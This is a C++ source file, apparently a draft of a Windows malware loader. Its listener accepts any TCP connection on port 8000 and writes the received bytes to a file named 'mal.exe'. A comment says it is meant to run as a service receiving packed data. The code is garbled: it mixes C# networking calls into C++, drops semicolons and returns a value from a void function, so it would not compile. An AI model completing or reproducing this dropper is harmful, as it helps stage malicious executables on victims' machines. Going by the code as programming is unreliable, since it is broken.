// Loader-win.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <fstream>

using namespace std;

//using System;
//using System.Net;
//using System.Net.Sockets;
//using System.Text;

void Tlistnr() {
	int portNum = 8000;

	bool done = false;

	var listener = new TcpListener(IPAddress.Any, portNum);

	listener.Start();

	while (!done)
	{
		Console.Write("Waiting for connection...");
		TcpClient client = listener.AcceptTcpClient();

		Console.WriteLine("Connection accepted.");
		NetworkStream ns = client.GetStream();

		//byte[] byteTime = Encoding.ASCII.GetBytes(DateTime.Now.ToString());
		byte[] byteData[100];

		try
		{
			//    ns.Write(byteTime, 0, byteTime.Length);
			ns.Write(byteData, 0, 100)
				outdata.open("mal.exe");
			outdata << bytedata << endl;
			outdata.close();


			ns.Close();
			client.Close();
		}
		catch (Exception e)
		{
			Console.WriteLine(e.ToString());
		}
	}

	listener.Stop();

	return 0;
}

int main() {
	Tlistnr()

	// Temporary... file will eventually be pulled in from some .NET framework with networking while running as a service to recieve packed data.
	ifstream infile;
	char data[100];

	infile.open("hello_world.txt", ios::in);

	cout << "Reading from the file" << endl;
	infile >> data;

	// write data to screen.
	cout << data << endl;

	// close opened input file.
	infile.close();

	return 0;
}
// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
